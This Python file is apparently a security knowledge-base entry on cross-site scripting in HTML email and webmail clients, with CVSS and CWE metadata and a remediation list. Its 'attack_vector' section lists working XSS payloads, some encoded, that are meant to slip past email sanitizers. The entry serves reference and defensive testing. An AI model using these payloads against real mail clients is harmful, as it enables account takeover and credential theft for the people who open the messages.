#!/usr/bin/env python3

"""
Project: BRS-KB
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26
Status: Created
Telegram: https://t.me/easyprotech

Knowledge Base: Email Context XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) in Email Context",
    "severity": "high",
    "cvss_score": 7.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    "reliability": "certain",
    "cwe": ["CWE-79", "CWE-94"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "email", "html-email", "webmail", "outlook", "gmail"],
    "description": """
XSS vulnerabilities in email contexts occur when HTML emails are rendered in webmail clients
or email preview panes. Email clients often have their own HTML sanitizers, but bypasses exist.

SEVERITY: HIGH
Email XSS can lead to account takeover, credential theft, and phishing within trusted contexts.
Webmail clients (Gmail, Outlook, Yahoo) each have unique parsing quirks.
""",
    "attack_vector": """
STYLE-BASED XSS:
<style>*{background:url('javascript:alert(1)')}</style>

SVG IN EMAIL:
<svg/onload=alert(1)>

DATA URI IN EMAIL:
<a href="data:text/html,<script>alert(1)</script>">Click</a>

CSS EXPRESSION (Legacy Outlook):
<div style="width:expression(alert(1))">

MHTML (Microsoft):
<iframe src="mhtml:file://path.mht!1.html">

AMP4EMAIL BYPASS:
<amp-img src=x onerror=alert(1)>

QUOTED-PRINTABLE ENCODING:
=3Cscript=3Ealert(1)=3C/script=3E

BASE64 BODY:
Content-Transfer-Encoding: base64
PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
""",
    "remediation": """
DEFENSE:

1. USE STRICT HTML SANITIZER for email rendering
2. Disable JavaScript completely in email contexts
3. Strip style tags and inline styles
4. Remove all event handlers
5. Whitelist safe HTML elements only
6. Use iframe sandboxing for email preview
7. Set Content-Security-Policy headers

EMAIL CLIENT TESTING:
- Test in Gmail, Outlook, Yahoo, ProtonMail
- Test both web and desktop clients
- Check mobile email apps

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- Email Security Best Practices
""",
}
